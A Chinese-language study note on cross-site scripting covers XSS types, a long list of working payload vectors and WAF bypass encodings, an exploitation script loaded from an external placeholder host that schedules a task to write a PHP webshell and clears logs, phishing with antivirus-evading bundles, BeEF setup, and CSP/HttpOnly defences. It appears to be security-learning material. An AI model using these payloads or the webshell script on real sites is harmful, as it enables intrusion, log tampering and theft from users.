---
{"dg-publish":true,"title":"WEB攻防_XSS","dg-path":"xiaodi/WEB攻防_XSS.md","permalink":"/xiaodi/WEB攻防_XSS/","dgPassFrontmatter":true}
---


# 什么是XSS
 
 XSS又叫CSS (Cross Site Script) ，跨站脚本攻击。是指恶意攻击者往 Web 页面里插入恶意 Script 代码，当用户浏览该页时，嵌入其中 Web 里面的 Script 代码会被执行，从而达到恶意攻击用户的目的。**类似于 sql 注入**。是目前最普遍的 Web 应用安全漏洞，也是 Web 攻击中最常见的攻击方式之一。

在浏览器的F12界面的控制台中，就可以执行js代码
![Pasted image 20240829094423.png](/img/user/picture/Pasted%20image%2020240829094423.png)
我的理解是：
这个漏洞是造成被攻击者在浏览器中被被动执行了一些有害代码。
所以叫跨站脚本攻击



有什么危害：  
  
+ 盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号  
+ 控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力  
+ 盗窃企业重要的具有商业价值的资料  
+ 非法转账  
+ 强制发送电子邮件  
+ 网站挂马  
+ 控制受害者机器向其它网站发起攻击


# XSS的分类：  
  
## 反射型：  

![Pasted image 20240809175236.png](/img/user/picture/Pasted%20image%2020240809175236.png)
  
定义：非持久型、参数型  
  
出现位置：URL 查询字符串中的参数、URL 文件路径、网站搜索栏、用户登入口位置  

常见情况是攻击者通过构造一个恶意链接的形式，诱导用户传播和打开，
由于链接内所携带的参数会回显于页面中或作为页面的处理数据源，最终造成XSS攻击。
~~很鸡肋~~
  
## 存储型  

![Pasted image 20240809180457.png](/img/user/picture/Pasted%20image%2020240809180457.png)
定义：持久型  
  
出现位置：网站留言、评论、博客日志等交互处  

存储型XSS是持久化的XSS攻击方式，将恶意代码存储于服务器端，
当其他用户再次访问页面时触发，造成XSS攻击。
  
## DOM型
DOM 代表**D**ocument **O**bject **M**odel，是 HTML 和XML文档的编程接口。它表示页面，以便程序可以更改文档的结构、样式和内容。网页是一个文档，这个文档可以在浏览器窗口中显示，也可以作为 HTML 源代码。下面显示了 HTML DOM 的示意图：
![Pasted image 20240809214822.png](/img/user/picture/Pasted%20image%2020240809214822.png)






# 其他类型XSS

参考文章：
https://www.fooying.com/the-art-of-xss-1-introduction/

## pdf上传导致的xss

就是在pdf中包含js代码，当这个pdf被浏览器解析时，就会执行里面的js代码

下面利用Adobe Acrobat DC工具来进行测试

![Pasted image 20240815210035.png](/img/user/picture/Pasted%20image%2020240815210035.png)
![Pasted image 20240815210042.png](/img/user/picture/Pasted%20image%2020240815210042.png)
![Pasted image 20240815210049.png](/img/user/picture/Pasted%20image%2020240815210049.png)
![Pasted image 20240815210055.png](/img/user/picture/Pasted%20image%2020240815210055.png)
然后保存就行了，将pdf打开后就会发现
![Pasted image 20240815210203.png](/img/user/picture/Pasted%20image%2020240815210203.png)


## flash-XSS

大致就是flash的文件类型中`.swf`文件可以包含js代码，如果网站上有`.swf`文件，可以下载下来进行反编译查看里面的js代码来分析是否可以进行xss利用



## mXSS
mXSS中文是突变型XSS，指的是原先的Payload提交是无害不会产生XSS，而由于一些特殊原因，如反编码等，导致Payload发生变异，导致的XSS。

现在应该已经见不到了



# XSS攻击常用标签
  `<scirpt>`

```bash
<script>alert("xss");</script>
```

  `<img>`

```xml
<img src=1 onerror=alert("xss");>
```

 `<input>`

```lua
<input onfocus="alert('xss');">
```

```lua
竞争焦点，从而触发onblur事件
<input onblur=alert("xss") autofocus><input autofocus>
```

```lua
通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
<input onfocus="alert('xss');" autofocus>
```

 `<details>`

```xml
<details ontoggle="alert('xss');">
```

```kotlin
使用open属性触发ontoggle事件，无需用户去触发
<details open ontoggle="alert('xss');">
```

 `<svg>`

```xml
<svg onload=alert("xss");>
```

 `<select>`

```xml
<select onfocus=alert(1)></select>
```

```xml
通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
<select onfocus=alert(1) autofocus>
```

 `<iframe>`

```xml
<iframe onload=alert("xss");></iframe>
```

`<video>`

```xml
<video><source onerror="alert(1)">
```

`<audio>`

```xml
<audio src=x  onerror=alert("xss");>
```

 `<body>`

```bash
<body/onload=alert("xss");>
```

利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发

```xml
<body
onscroll=alert("xss");><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
```

 `<textarea>`

```xml
<textarea onfocus=alert("xss"); autofocus>
```

 `<keygen>`

```xml
<keygen autofocus onfocus=alert(1)> //仅限火狐
```

 `<marquee>`

```xml
<marquee onstart=alert("xss")></marquee> //Chrome不行，火狐和IE都可以
```

 `<isindex>`

```xml
<isindex type=image src=1 onerror=alert("xss")>//仅限于IE
```

### 利用link远程包含js文件

**PS：在无CSP的情况下才可以**

```xml
<link rel=import href="http://127.0.0.1/1.js">
```

### javascript伪协议

`<a>`标签

```xml
<a href="javascript:alert(`xss`);">xss</a>
```

`<iframe>`标签

```xml
<iframe src=javascript:alert('xss');></iframe>
```

`<img>`标签

```csharp
<img src=javascript:alert('xss')>//IE7以下
```

`<form>`标签

```xml
<form action="Javascript:alert(1)"><input type=submit>
```

### 其它

expression属性

```javascript
<img style="xss:expression(alert('xss''))"> // IE7以下
<div style="color:rgb(''�x:expression(alert(1))"></div> //IE7以下
<style>#test{x:expression(alert(/XSS/))}</style> // IE7以下
```

background属性

```xml
<table background=javascript:alert(1)></table> //在Opera 10.5和IE6上有效
```


# 过滤绕过

## 过滤空格

用`/`代替空格

<img/src="x"/onerror=alert("xss");>

## 过滤关键字

### 大小写绕过

`<ImG sRc=x onerRor=alert("xss");>`

### 双写关键字

有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过

`<imimgg srsrcc=x onerror=alert("xss");>`

### 字符拼接

利用eval

`<img src="x" onerror="a=`aler`;b=`t`;c='(`xss`);';eval(a+b+c)">`

利用top

```xml
<script>top["al"+"ert"](`xss`);</script>
```

### 其它字符混淆

有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了  
下面举几个简单的例子

```php-template
可利用注释、标签的优先级等
1.<<script>alert("xss");//<</script>
2.<title><img src=</title>><img src=x onerror="alert(`xss`);"> //因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效
3.<SCRIPT>var a="\\";alert("xss");//";</SCRIPT>
```

### 编码绕过

Unicode编码绕过

`<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41;&#59;">`

`<img src="x" onerror="eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b')">`

url编码绕过

`<img src="x" onerror="eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))">`

```perl
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
```

Ascii码绕过

`<img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))">`

hex绕过

```xml
<img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')>
```

八进制

```xml
<img src=x onerror=alert('\170\163\163')>
```

base64绕过

```xml
<img src="x" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))">
```

```xml
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
```

## 过滤双引号，单引号

1.如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号

```xml
<img src="x" onerror=alert(`xss`);>
```

2.使用编码绕过，具体看上面我列举的例子，我就不多赘述了

## 过滤括号

当括号被过滤的时候可以使用throw来绕过

```bash
<svg/onload="window.onerror=eval;throw'=alert\x281\x29';">
```

## 过滤url地址

### 使用url编码

```dos
<img src="x" onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`>
```

### 使用IP

1.十进制IP

```javascript
<img src="x" onerror=document.location=`http://2130706433/`>
```

2.八进制IP

```javascript
<img src="x" onerror=document.location=`http://0177.0.0.01/`>
```

3.hex

```javascript
<img src="x" onerror=document.location=`http://0x7f.0x0.0x0.0x1/`>
```

4.html标签中用`//`可以代替`http://`

```javascript
<img src="x" onerror=document.location=`//www.baidu.com`>
```

5.使用`\\`

```lua
但是要注意在windows下\本身就有特殊用途，是一个path 的写法，所以\\在Windows下是file协议，在linux下才会是当前域的协议
```


6.使用中文逗号代替英文逗号  
如果你在你在域名中输入中文句号浏览器会自动转化成英文的逗号

```cpp
<img src="x" onerror="document.location=`http://www。baidu。com`">//会自动跳转到百度
```





# 练习

[[blog/安全/靶场/CTFshow_XSS_反射型\|CTFshow_XSS_反射型]]
[[blog/安全/靶场/CTFshow_XSS_存储型\|CTFshow_XSS_存储型]]
[[blog/安全/靶场/自建环境_xss-labs\|自建环境_xss-labs]]


# XSS平台





# 漏洞利用


## 凭据盗取

也就是获取信息，比如管理员cookie之类的




## 数据提交

**条件：熟悉后台业务功能数据包，利用JS写一个模拟提交**
**利用：凭据获取不到或有防护无法利用凭据进入时执行其他**

**这种利用就要求对网站构造有一定的熟悉**

这里xiaodi的例子是现在服务器中上传一个恶意的js文件，然后再插入一段XSS payload
```js
<script src="http://xx.xxx.xxx/poc.js"></script>
```
这里的 `src` 属性指定了要加载的外部脚本的URL，也就是这个payload会执行这个js代码

而js代码如下：
```js
function poc(){

  $.get('/service/app/tasks.php?type=task_list',{},function(data){

    var id=data.data[0].ID;

    $.post('/service/app/tasks.php?type=exec_task',{

      tid:id

    },function(res2){

        $.post('/service/app/log.php?type=clearlog',{

        },function(res3){},"json");

    },"json");

  },"json");

}

function save(){

  var data=new Object();

  data.task_id="";

  data.title="test";

  data.exec_cycle="1";

  data.week="1";

  data.day="3";

  data.hour="14";

  data.minute = "20";

  data.shell='echo "<?php @eval($_POST[123]);?>" >C:/xp.cn/www/wwwroot/admin/localhost_80/wwwroot/1.php';

  $.post('/service/app/tasks.php?type=save_shell',data,function(res){

    poc();

  },'json');

}

save();
```
这段代码也就是创建一个系统定时任务，这个任务会向指定的地方去创建一个后门文件(1.php)
注意：这个地址要根据要攻击网站来进行修改







## 网络钓鱼

1、部署可访问的钓鱼页面并修改

2、植入XSS代码等待受害者触发

3、将后门及正常文件捆绑打包免杀

https://github.com/r00tSe7en/Fake-flash.cn

## 溯源综合

1、XSS数据平台-XSSReceiver

简单配置即可使用，无需数据库，无需其他组件支持

搭建：https://github.com/epoch99/BlueLotus_XSSReceiver-master

2、浏览器控制框架-beef-xss

只需执行JS文件，即可实现对当前浏览器的控制，可配合各类手法利用

搭建：docker run --rm -p 3000:3000 janes/beef



# 安全防御

## CSP (Content Security Policy 内容安全策略) 

内容安全策略是一种可信白名单机制，来限制网站中是否可以包含某来源内容。
该制度明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单，
它的实现和执行全部由**浏览器**完成，开发者只需提供配置。
禁止加载外域代码，防止复杂的攻击逻辑。
禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。
禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。
禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。
合理使用上报可以及时发现XSS，利于尽快修复问题。


### 1、CSP的部分命令：

CSP有两种指令方式：  
（1）HTTPheader：比如在HTTP的响应头中设置Content-Security-Policy的值。  
（2）HTML：比如在html里插入meta标签来实现。  
如果都设置的话，以HTTP响应头里的为准

### 2、策略控制：

这里使用PHPstudy搭建一个简易的网站，网站的代码如下：
```php
<meta charset="utf-8">
<?php
//只允许加载本地源图片：
header("Content-Security-Policy:img-src 'self' ");
?>

//允许加载所有源下的图片
<meta http-equiv="Content-Security-Policy" content="img-src*;">

//加载的是一张我随意百度的图片
<img src="https://ss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=464542646,4082158470&fm=27&gp=0.jpg"/>

```

（1）首先我们先把meta标签注释掉，如下：

![Pasted image 20240826175545.png](/img/user/picture/Pasted%20image%2020240826175545.png)
接着我们打开火狐浏览器，然后进行访问：  
我们发现底下的红色字迹提示内容的安全政策，表明header生效了，只允许加载本地源图片。
![Pasted image 20240826175600.png](/img/user/picture/Pasted%20image%2020240826175600.png)


除此之外，我们在网络模块中，可以看到响应头中的确出现了安全政策。


![Pasted image 20240826175613.png](/img/user/picture/Pasted%20image%2020240826175613.png)

（2）我们这次只注释掉header：
![Pasted image 20240826175635.png](/img/user/picture/Pasted%20image%2020240826175635.png)
然后我们发现加载出了图片
![Pasted image 20240826175646.png](/img/user/picture/Pasted%20image%2020240826175646.png)


（3）两段CSP代码都不注释：
我们的图片找不到了，说明HTTP头起作用了
![Pasted image 20240826175704.png](/img/user/picture/Pasted%20image%2020240826175704.png)

### 3、CSP完整命令：


| 指令            | 说明                                                                                                                                                                                                                               |
| :------------ | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| base-url      | 文档的基准URL                                                                                                                                                                                                                         |
| child-src     | web workers 以及嵌套的浏览上下文（如`<frame>`和`<iframe>`）的源                                                                                                                                                                                  |
| connect-src   | 请求、XMLHttpRequest、WebSocket和EvenSource的连接来源                                                                                                                                                                                      |
| default-src   | child-src  <br>connect-src  <br>font-src：控制字体文件来源  <br>img-src：控制图片来源  <br>media-src：控制video和audio标签里的资源来源  <br>object-src：控制`<object>`、`<embed>`、`<applet>`标签里资源的来源  <br>script-src：控制JavaScript的有效来源  <br>style-src：控制css的有效来源 |
| plugin-types  | 控制`<object>`、`<embed>`、`<applet>`插件资源的来源                                                                                                                                                                                         |
| reflected-xss | 控制浏览器对于反射型xss的策略                                                                                                                                                                                                                 |
| report-url    | 用于接收浏览器发送违反CSP页面的报告地址                                                                                                                                                                                                            |
| sandbox       | 控制是否控制阻止弹窗，插件，脚本执行等                                                                                                                                                                                                              |




## HttpOnly


**禁止页面的JavaScript访问带有HttpOnly属性的Cookie**
![Pasted image 20240826181607.png](/img/user/picture/Pasted%20image%2020240826181607.png)
这个开启了也就说明没法通过xss漏洞来获取cookie了


##  XSS Filter
也就是代码进行XSS过滤


# 工具-XSSstrike

https://github.com/s0md3v/XSStrike+